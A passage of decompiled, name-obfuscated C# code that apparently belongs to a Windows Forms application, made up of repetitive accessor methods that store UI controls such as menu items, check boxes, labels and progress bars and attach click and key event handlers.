	internal Label vmethod_92()
	{
		return this.label_4;
	}

	// Token: 0x0600057A RID: 1402 RVA: 0x000054C8 File Offset: 0x000036C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_93(Label label_30)
	{
		this.label_4 = label_30;
	}

	// Token: 0x0600057B RID: 1403 RVA: 0x000054D1 File Offset: 0x000036D1
	internal CheckBox vmethod_94()
	{
		return this.checkBox_0;
	}

	// Token: 0x0600057C RID: 1404 RVA: 0x000365C0 File Offset: 0x000347C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_95(CheckBox checkBox_8)
	{
		EventHandler value = new EventHandler(this.method_167);
		KeyEventHandler value2 = new KeyEventHandler(this.method_176);
		CheckBox checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
			checkBox.KeyDown -= value2;
		}
		this.checkBox_0 = checkBox_8;
		checkBox = this.checkBox_0;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
			checkBox.KeyDown += value2;
		}
	}

	// Token: 0x0600057D RID: 1405 RVA: 0x000054D9 File Offset: 0x000036D9
	internal CheckBox vmethod_96()
	{
		return this.checkBox_1;
	}

	// Token: 0x0600057E RID: 1406 RVA: 0x00036620 File Offset: 0x00034820
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_97(CheckBox checkBox_8)
	{
		EventHandler value = new EventHandler(this.method_75);
		KeyEventHandler value2 = new KeyEventHandler(this.method_175);
		CheckBox checkBox = this.checkBox_1;
		if (checkBox != null)
		{
			checkBox.CheckedChanged -= value;
			checkBox.KeyDown -= value2;
		}
		this.checkBox_1 = checkBox_8;
		checkBox = this.checkBox_1;
		if (checkBox != null)
		{
			checkBox.CheckedChanged += value;
			checkBox.KeyDown += value2;
		}
	}

	// Token: 0x0600057F RID: 1407 RVA: 0x000054E1 File Offset: 0x000036E1
	internal RadioButton vmethod_98()
	{
		return this.radioButton_0;
	}

	// Token: 0x06000580 RID: 1408 RVA: 0x00036680 File Offset: 0x00034880
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_99(RadioButton radioButton_2)
	{
		EventHandler value = new EventHandler(this.method_76);
		KeyEventHandler value2 = new KeyEventHandler(this.method_178);
		RadioButton radioButton = this.radioButton_0;
		if (radioButton != null)
		{
			radioButton.CheckedChanged -= value;
			radioButton.KeyDown -= value2;
		}
		this.radioButton_0 = radioButton_2;
		radioButton = this.radioButton_0;
		if (radioButton != null)
		{
			radioButton.CheckedChanged += value;
			radioButton.KeyDown += value2;
		}
	}

	// Token: 0x06000581 RID: 1409 RVA: 0x000054E9 File Offset: 0x000036E9
	internal RadioButton vmethod_100()
	{
		return this.radioButton_1;
	}

	// Token: 0x06000582 RID: 1410 RVA: 0x000366E0 File Offset: 0x000348E0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_101(RadioButton radioButton_2)
	{
		EventHandler value = new EventHandler(this.method_77);
		KeyEventHandler value2 = new KeyEventHandler(this.method_179);
		RadioButton radioButton = this.radioButton_1;
		if (radioButton != null)
		{
			radioButton.CheckedChanged -= value;
			radioButton.KeyDown -= value2;
		}
		this.radioButton_1 = radioButton_2;
		radioButton = this.radioButton_1;
		if (radioButton != null)
		{
			radioButton.CheckedChanged += value;
			radioButton.KeyDown += value2;
		}
	}

	// Token: 0x06000583 RID: 1411 RVA: 0x000054F1 File Offset: 0x000036F1
	internal ContextMenuStrip vmethod_102()
	{
		return this.contextMenuStrip_3;
	}

	// Token: 0x06000584 RID: 1412 RVA: 0x000054F9 File Offset: 0x000036F9
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_103(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_3 = contextMenuStrip_14;
	}

	// Token: 0x06000585 RID: 1413 RVA: 0x00005502 File Offset: 0x00003702
	internal ToolStripMenuItem vmethod_104()
	{
		return this.toolStripMenuItem_22;
	}

	// Token: 0x06000586 RID: 1414 RVA: 0x00036740 File Offset: 0x00034940
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_105(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_42);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_22 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_22;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000587 RID: 1415 RVA: 0x0000550A File Offset: 0x0000370A
	internal ToolStripSeparator vmethod_106()
	{
		return this.toolStripSeparator_5;
	}

	// Token: 0x06000588 RID: 1416 RVA: 0x00005512 File Offset: 0x00003712
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_107(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_5 = toolStripSeparator_39;
	}

	// Token: 0x06000589 RID: 1417 RVA: 0x0000551B File Offset: 0x0000371B
	internal ToolStripMenuItem vmethod_108()
	{
		return this.toolStripMenuItem_23;
	}

	// Token: 0x0600058A RID: 1418 RVA: 0x00036784 File Offset: 0x00034984
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_109(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_45);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_23 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_23;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600058B RID: 1419 RVA: 0x00005523 File Offset: 0x00003723
	internal ContextMenuStrip vmethod_110()
	{
		return this.contextMenuStrip_4;
	}

	// Token: 0x0600058C RID: 1420 RVA: 0x0000552B File Offset: 0x0000372B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_111(ContextMenuStrip contextMenuStrip_14)
	{
		this.contextMenuStrip_4 = contextMenuStrip_14;
	}

	// Token: 0x0600058D RID: 1421 RVA: 0x00005534 File Offset: 0x00003734
	internal ToolStripMenuItem vmethod_112()
	{
		return this.toolStripMenuItem_24;
	}

	// Token: 0x0600058E RID: 1422 RVA: 0x000367C8 File Offset: 0x000349C8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_113(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_46);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_24;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_24 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_24;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x0600058F RID: 1423 RVA: 0x0000553C File Offset: 0x0000373C
	internal ToolStripSeparator vmethod_114()
	{
		return this.toolStripSeparator_6;
	}

	// Token: 0x06000590 RID: 1424 RVA: 0x00005544 File Offset: 0x00003744
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_115(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_6 = toolStripSeparator_39;
	}

	// Token: 0x06000591 RID: 1425 RVA: 0x0000554D File Offset: 0x0000374D
	internal ToolStripMenuItem vmethod_116()
	{
		return this.toolStripMenuItem_25;
	}

	// Token: 0x06000592 RID: 1426 RVA: 0x0003680C File Offset: 0x00034A0C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_117(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_47);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_25 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_25;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x06000593 RID: 1427 RVA: 0x00005555 File Offset: 0x00003755
	internal ImageList vmethod_118()
	{
		return this.imageList_0;
	}

	// Token: 0x06000594 RID: 1428 RVA: 0x0000555D File Offset: 0x0000375D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_119(ImageList imageList_4)
	{
		this.imageList_0 = imageList_4;
	}

	// Token: 0x06000595 RID: 1429 RVA: 0x00005566 File Offset: 0x00003766
	internal ZeroitAnidasoCircleProgress vmethod_120()
	{
		return this.zeroitAnidasoCircleProgress_0;
	}

	// Token: 0x06000596 RID: 1430 RVA: 0x0000556E File Offset: 0x0000376E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_121(ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress_8)
	{
		this.zeroitAnidasoCircleProgress_0 = zeroitAnidasoCircleProgress_8;
	}

	// Token: 0x06000597 RID: 1431 RVA: 0x00005577 File Offset: 0x00003777
	internal StatusStrip vmethod_122()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000598 RID: 1432 RVA: 0x0000557F File Offset: 0x0000377F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_123(StatusStrip statusStrip_11)
	{
		this.statusStrip_0 = statusStrip_11;
	}

	// Token: 0x06000599 RID: 1433 RVA: 0x00005588 File Offset: 0x00003788
	internal ToolStripStatusLabel vmethod_124()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x0600059A RID: 1434 RVA: 0x00005590 File Offset: 0x00003790
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_125(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_40;
	}

	// Token: 0x0600059B RID: 1435 RVA: 0x00005599 File Offset: 0x00003799
	internal ToolStripStatusLabel vmethod_126()
	{
		return this.toolStripStatusLabel_1;
	}

	// Token: 0x0600059C RID: 1436 RVA: 0x000055A1 File Offset: 0x000037A1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_127(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_1 = toolStripStatusLabel_40;
	}

	// Token: 0x0600059D RID: 1437 RVA: 0x000055AA File Offset: 0x000037AA
	internal ToolStripStatusLabel vmethod_128()
	{
		return this.toolStripStatusLabel_2;
	}

	// Token: 0x0600059E RID: 1438 RVA: 0x000055B2 File Offset: 0x000037B2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_129(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_2 = toolStripStatusLabel_40;
	}

	// Token: 0x0600059F RID: 1439 RVA: 0x000055BB File Offset: 0x000037BB
	internal ToolStripStatusLabel vmethod_130()
	{
		return this.toolStripStatusLabel_3;
	}

	// Token: 0x060005A0 RID: 1440 RVA: 0x000055C3 File Offset: 0x000037C3
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_131(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_3 = toolStripStatusLabel_40;
	}

	// Token: 0x060005A1 RID: 1441 RVA: 0x000055CC File Offset: 0x000037CC
	internal ToolStripStatusLabel vmethod_132()
	{
		return this.toolStripStatusLabel_4;
	}

	// Token: 0x060005A2 RID: 1442 RVA: 0x000055D4 File Offset: 0x000037D4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_133(ToolStripStatusLabel toolStripStatusLabel_40)
	{
		this.toolStripStatusLabel_4 = toolStripStatusLabel_40;
	}

	// Token: 0x060005A3 RID: 1443 RVA: 0x000055DD File Offset: 0x000037DD
	internal ToolStripProgressBar vmethod_134()
	{
		return this.toolStripProgressBar_0;
	}

	// Token: 0x060005A4 RID: 1444 RVA: 0x000055E5 File Offset: 0x000037E5
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_135(ToolStripProgressBar toolStripProgressBar_8)
	{
		this.toolStripProgressBar_0 = toolStripProgressBar_8;
	}

	// Token: 0x060005A5 RID: 1445 RVA: 0x000055EE File Offset: 0x000037EE
	internal ToolStripMenuItem vmethod_136()
	{
		return this.toolStripMenuItem_26;
	}

	// Token: 0x060005A6 RID: 1446 RVA: 0x00036850 File Offset: 0x00034A50
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_137(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_55);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_26 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_26;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005A7 RID: 1447 RVA: 0x000055F6 File Offset: 0x000037F6
	internal ToolStripMenuItem vmethod_138()
	{
		return this.toolStripMenuItem_27;
	}

	// Token: 0x060005A8 RID: 1448 RVA: 0x00036894 File Offset: 0x00034A94
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_139(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_56);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_27;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_27 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_27;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005A9 RID: 1449 RVA: 0x000055FE File Offset: 0x000037FE
	internal ToolStripSeparator vmethod_140()
	{
		return this.toolStripSeparator_7;
	}

	// Token: 0x060005AA RID: 1450 RVA: 0x00005606 File Offset: 0x00003806
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_141(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_7 = toolStripSeparator_39;
	}

	// Token: 0x060005AB RID: 1451 RVA: 0x0000560F File Offset: 0x0000380F
	internal ToolStripSeparator vmethod_142()
	{
		return this.toolStripSeparator_8;
	}

	// Token: 0x060005AC RID: 1452 RVA: 0x00005617 File Offset: 0x00003817
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_143(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_8 = toolStripSeparator_39;
	}

	// Token: 0x060005AD RID: 1453 RVA: 0x00005620 File Offset: 0x00003820
	internal ToolStripMenuItem vmethod_144()
	{
		return this.toolStripMenuItem_28;
	}

	// Token: 0x060005AE RID: 1454 RVA: 0x00005628 File Offset: 0x00003828
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_145(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_28 = toolStripMenuItem_136;
	}

	// Token: 0x060005AF RID: 1455 RVA: 0x00005631 File Offset: 0x00003831
	internal ToolStripMenuItem vmethod_146()
	{
		return this.toolStripMenuItem_29;
	}

	// Token: 0x060005B0 RID: 1456 RVA: 0x00005639 File Offset: 0x00003839
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_147(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_29 = toolStripMenuItem_136;
	}

	// Token: 0x060005B1 RID: 1457 RVA: 0x00005642 File Offset: 0x00003842
	internal ToolStripMenuItem vmethod_148()
	{
		return this.toolStripMenuItem_30;
	}

	// Token: 0x060005B2 RID: 1458 RVA: 0x000368D8 File Offset: 0x00034AD8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_149(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_59);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_30;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_30 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_30;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005B3 RID: 1459 RVA: 0x0000564A File Offset: 0x0000384A
	internal ToolStripMenuItem vmethod_150()
	{
		return this.toolStripMenuItem_31;
	}

	// Token: 0x060005B4 RID: 1460 RVA: 0x00005652 File Offset: 0x00003852
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_151(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_31 = toolStripMenuItem_136;
	}

	// Token: 0x060005B5 RID: 1461 RVA: 0x0000565B File Offset: 0x0000385B
	internal ToolStripMenuItem vmethod_152()
	{
		return this.toolStripMenuItem_32;
	}

	// Token: 0x060005B6 RID: 1462 RVA: 0x0003691C File Offset: 0x00034B1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_153(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_70);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_32;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_32 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_32;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005B7 RID: 1463 RVA: 0x00005663 File Offset: 0x00003863
	internal ToolStripSeparator vmethod_154()
	{
		return this.toolStripSeparator_9;
	}

	// Token: 0x060005B8 RID: 1464 RVA: 0x0000566B File Offset: 0x0000386B
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_155(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_9 = toolStripSeparator_39;
	}

	// Token: 0x060005B9 RID: 1465 RVA: 0x00005674 File Offset: 0x00003874
	internal Panel vmethod_156()
	{
		return this.panel_0;
	}

	// Token: 0x060005BA RID: 1466 RVA: 0x0000567C File Offset: 0x0000387C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_157(Panel panel_2)
	{
		this.panel_0 = panel_2;
	}

	// Token: 0x060005BB RID: 1467 RVA: 0x00005685 File Offset: 0x00003885
	internal Label vmethod_158()
	{
		return this.label_5;
	}

	// Token: 0x060005BC RID: 1468 RVA: 0x0000568D File Offset: 0x0000388D
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_159(Label label_30)
	{
		this.label_5 = label_30;
	}

	// Token: 0x060005BD RID: 1469 RVA: 0x00005696 File Offset: 0x00003896
	internal ZeroitProgressBarNormal vmethod_160()
	{
		return this.zeroitProgressBarNormal_0;
	}

	// Token: 0x060005BE RID: 1470 RVA: 0x0000569E File Offset: 0x0000389E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_161(ZeroitProgressBarNormal zeroitProgressBarNormal_2)
	{
		this.zeroitProgressBarNormal_0 = zeroitProgressBarNormal_2;
	}

	// Token: 0x060005BF RID: 1471 RVA: 0x000056A7 File Offset: 0x000038A7
	internal Label vmethod_162()
	{
		return this.label_6;
	}

	// Token: 0x060005C0 RID: 1472 RVA: 0x000056AF File Offset: 0x000038AF
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_163(Label label_30)
	{
		this.label_6 = label_30;
	}

	// Token: 0x060005C1 RID: 1473 RVA: 0x000056B8 File Offset: 0x000038B8
	internal Label vmethod_164()
	{
		return this.label_7;
	}

	// Token: 0x060005C2 RID: 1474 RVA: 0x000056C0 File Offset: 0x000038C0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_165(Label label_30)
	{
		this.label_7 = label_30;
	}

	// Token: 0x060005C3 RID: 1475 RVA: 0x000056C9 File Offset: 0x000038C9
	internal Label vmethod_166()
	{
		return this.label_8;
	}

	// Token: 0x060005C4 RID: 1476 RVA: 0x000056D1 File Offset: 0x000038D1
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_167(Label label_30)
	{
		this.label_8 = label_30;
	}

	// Token: 0x060005C5 RID: 1477 RVA: 0x000056DA File Offset: 0x000038DA
	internal ToolStripMenuItem vmethod_168()
	{
		return this.toolStripMenuItem_33;
	}

	// Token: 0x060005C6 RID: 1478 RVA: 0x000056E2 File Offset: 0x000038E2
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_169(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_33 = toolStripMenuItem_136;
	}

	// Token: 0x060005C7 RID: 1479 RVA: 0x000056EB File Offset: 0x000038EB
	internal ToolStripMenuItem vmethod_170()
	{
		return this.toolStripMenuItem_34;
	}

	// Token: 0x060005C8 RID: 1480 RVA: 0x00036960 File Offset: 0x00034B60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_171(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_57);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_34;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_34 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_34;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005C9 RID: 1481 RVA: 0x000056F3 File Offset: 0x000038F3
	internal ToolStripMenuItem vmethod_172()
	{
		return this.toolStripMenuItem_35;
	}

	// Token: 0x060005CA RID: 1482 RVA: 0x000056FB File Offset: 0x000038FB
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_173(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_35 = toolStripMenuItem_136;
	}

	// Token: 0x060005CB RID: 1483 RVA: 0x00005704 File Offset: 0x00003904
	internal ToolStripMenuItem vmethod_174()
	{
		return this.toolStripMenuItem_36;
	}

	// Token: 0x060005CC RID: 1484 RVA: 0x000369A4 File Offset: 0x00034BA4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_175(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_58);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_36;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_36 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_36;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005CD RID: 1485 RVA: 0x0000570C File Offset: 0x0000390C
	internal ToolStripSeparator vmethod_176()
	{
		return this.toolStripSeparator_10;
	}

	// Token: 0x060005CE RID: 1486 RVA: 0x00005714 File Offset: 0x00003914
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_177(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_10 = toolStripSeparator_39;
	}

	// Token: 0x060005CF RID: 1487 RVA: 0x0000571D File Offset: 0x0000391D
	internal ToolStripMenuItem vmethod_178()
	{
		return this.toolStripMenuItem_37;
	}

	// Token: 0x060005D0 RID: 1488 RVA: 0x000369E8 File Offset: 0x00034BE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_179(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_60);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_37;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_37 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_37;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005D1 RID: 1489 RVA: 0x00005725 File Offset: 0x00003925
	internal ToolStripMenuItem vmethod_180()
	{
		return this.toolStripMenuItem_38;
	}

	// Token: 0x060005D2 RID: 1490 RVA: 0x00036A2C File Offset: 0x00034C2C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_181(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_60);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_38;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_38 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_38;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005D3 RID: 1491 RVA: 0x0000572D File Offset: 0x0000392D
	internal ToolStripMenuItem vmethod_182()
	{
		return this.toolStripMenuItem_39;
	}

	// Token: 0x060005D4 RID: 1492 RVA: 0x00005735 File Offset: 0x00003935
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_183(ToolStripMenuItem toolStripMenuItem_136)
	{
		this.toolStripMenuItem_39 = toolStripMenuItem_136;
	}

	// Token: 0x060005D5 RID: 1493 RVA: 0x0000573E File Offset: 0x0000393E
	internal ToolStripMenuItem vmethod_184()
	{
		return this.toolStripMenuItem_40;
	}

	// Token: 0x060005D6 RID: 1494 RVA: 0x00036A70 File Offset: 0x00034C70
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_185(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_162);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_40;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_40 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_40;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005D7 RID: 1495 RVA: 0x00005746 File Offset: 0x00003946
	internal ToolStripMenuItem vmethod_186()
	{
		return this.toolStripMenuItem_41;
	}

	// Token: 0x060005D8 RID: 1496 RVA: 0x00036AB4 File Offset: 0x00034CB4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_187(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_163);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_41;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_41 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_41;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005D9 RID: 1497 RVA: 0x0000574E File Offset: 0x0000394E
	internal ToolStripSeparator vmethod_188()
	{
		return this.toolStripSeparator_11;
	}

	// Token: 0x060005DA RID: 1498 RVA: 0x00005756 File Offset: 0x00003956
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_189(ToolStripSeparator toolStripSeparator_39)
	{
		this.toolStripSeparator_11 = toolStripSeparator_39;
	}

	// Token: 0x060005DB RID: 1499 RVA: 0x0000575F File Offset: 0x0000395F
	internal ToolStripMenuItem vmethod_190()
	{
		return this.toolStripMenuItem_42;
	}

	// Token: 0x060005DC RID: 1500 RVA: 0x00036AF8 File Offset: 0x00034CF8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_191(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_61);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_42;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_42 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_42;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005DD RID: 1501 RVA: 0x00005767 File Offset: 0x00003967
	internal ToolStripMenuItem vmethod_192()
	{
		return this.toolStripMenuItem_43;
	}

	// Token: 0x060005DE RID: 1502 RVA: 0x00036B3C File Offset: 0x00034D3C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_193(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_61);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_43;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_43 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_43;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005DF RID: 1503 RVA: 0x0000576F File Offset: 0x0000396F
	internal ToolStripMenuItem vmethod_194()
	{
		return this.toolStripMenuItem_44;
	}

	// Token: 0x060005E0 RID: 1504 RVA: 0x00036B80 File Offset: 0x00034D80
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_195(ToolStripMenuItem toolStripMenuItem_136)
	{
		EventHandler value = new EventHandler(this.method_62);
		ToolStripMenuItem toolStripMenuItem = this.toolStripMenuItem_44;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click -= value;
		}
		this.toolStripMenuItem_44 = toolStripMenuItem_136;
		toolStripMenuItem = this.toolStripMenuItem_44;
		if (toolStripMenuItem != null)
		{
			toolStripMenuItem.Click += value;
		}
	}

	// Token: 0x060005E1 RID: 1505 RVA: 0x00005777 File Offset: 0x00003977
	internal ToolStripMenuItem vmethod_196()
	{
		return this.toolStripMenuItem_45;
	}

	// Token: 0x060005E2 RID: 1506 RVA: 0x00036BC4 File Offset: 0x00034DC4
	[MethodImpl(MethodImplOptions.Synchronized)]
